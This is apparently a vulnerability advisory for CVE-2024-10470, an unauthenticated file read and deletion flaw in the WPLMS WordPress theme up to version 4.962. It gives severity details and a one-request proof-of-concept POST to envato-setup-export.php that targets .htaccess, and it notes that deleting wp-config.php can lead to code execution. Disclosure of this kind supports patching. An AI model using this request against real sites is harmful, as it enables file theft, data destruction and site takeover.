# CVE-2024-10470
WPLMS Learning Management System for WordPress &lt;= 4.962 – Unauthenticated Arbitrary File Read and Deletion

# Description

The WPLMS Learning Management System for WordPress, WordPress LMS theme for WordPress is vulnerable to arbitrary file read and deletion due to insufficient file path validation and permissions checks in the readfile and unlink functions in all versions up to, and including, 4.962. This makes it possible for unauthenticated attackers to delete arbitrary files on the server, which can easily lead to remote code execution when the right file is deleted (such as wp-config.php). The theme is vulnerable even when it is not activated.


```
Affected Theme: WPLMS Learning Management System for WordPress
Theme Slug: wplms
Affected Versions: <= 4.962
CVE ID: CVE-2024-10470
CVSS Score: 9.8 (Critical)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Researcher/s: Foxyyy
Fully Patched Version: 4.963
```

POC
---

```
POST /wp-content/themes/wplms/setup/installer/envato-setup-export.php HTTP/1.1
Host: kubernetes.docker.internal
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

download_export_zip=1&zip_file=.htaccess
```
